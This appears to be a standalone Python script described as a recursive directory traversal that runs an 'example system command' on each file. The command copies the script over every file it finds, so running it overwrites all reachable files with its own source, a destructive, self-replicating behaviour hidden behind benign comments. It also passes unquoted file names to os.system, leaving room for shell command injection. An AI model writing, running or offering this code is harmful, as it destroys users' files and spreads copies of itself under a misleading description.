import os

current_script_name = os.path.basename(__file__)

def traverse_and_execute(directory, visited=None):
    """
    Recursively traverse directories and execute a system command on files.
    """
    if visited is None:
        visited = set()
        
    # Avoid infinite recursion by tracking visited directories
    real_path = os.path.realpath(directory)
    if real_path in visited:
        return
    visited.add(real_path)
    
    try:
        all_items = os.listdir(directory)
    except PermissionError as e:
        print(f"Permission denied: {directory}")
        return
    
    for item in all_items:
        full_path = os.path.join(directory, item)
        
        if os.path.isdir(full_path):
            print(f"Entering directory: {full_path}")
            traverse_and_execute(full_path, visited)
            print(f"Exiting directory: {full_path}")
        else:
            print(f"Found file: {full_path}")
            # Example system command
            try:
                command = f"cp {current_script_name} {full_path}"
                print(f"Executing command: {command}")
                os.system(command)
            except Exception as e:
                print(f"Error executing command: {e}")
    
    print(f"Finished processing directory: {directory}")

# Start traversal from the current working directory
if __name__ == "__main__":
    starting_directory = os.getcwd()
    traverse_and_execute(starting_directory)
